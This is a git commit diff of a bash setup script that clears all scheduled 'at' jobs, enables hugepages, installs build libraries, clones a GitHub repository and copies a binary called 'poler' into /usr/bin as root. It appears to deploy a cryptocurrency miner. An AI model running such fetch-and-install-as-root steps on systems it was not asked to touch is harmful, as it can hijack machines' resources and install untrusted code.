2bd5e3311d4e09d536ca52f98a8c173b82889c78
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-07-31 12:11:14 +0300

    zaloop

--- belya.sh
+++ belya.sh
@@ -1,28 +1,22 @@
 #!/bin/bash
 
-rm -rf /tmp/fckin-final3/
+rm -rf /tmp/next1/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
-sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano dos2unix cmake mc -y
 sleep 2
-cd /tmp && mkdir fckin-final3
-git clone https://github.com/masketteland/fckin-final3.git /tmp/fckin-final3
-cd /tmp/fckin-final3
-chmod +x /tmp/fckin-final3/poler
+cd /tmp && mkdir next1
+git clone https://github.com/wizarduated/next1.git /tmp/next1
+cd /tmp/next1
+chmod +x /tmp/next1/poler
 chmod 777 ./*.sh
-cp /tmp/fckin-final3/poler /usr/bin/
+cp /tmp/next1/poler /usr/bin/
 sleep 3
 
-sudo apt-get install dos2unix
 sudo dos2unix time1.sh
-sudo dos2unix 75.sh
-sudo dos2unix 50.sh
-sudo dos2unix 80.sh
-sudo dos2unix 65.sh
-sudo dos2unix 90.sh
-sudo dos2unix 40.sh
+sudo dos2unix zaloop.sh
 
 touch /tmp/at.txt
 chmod +x /tmp/at.txt
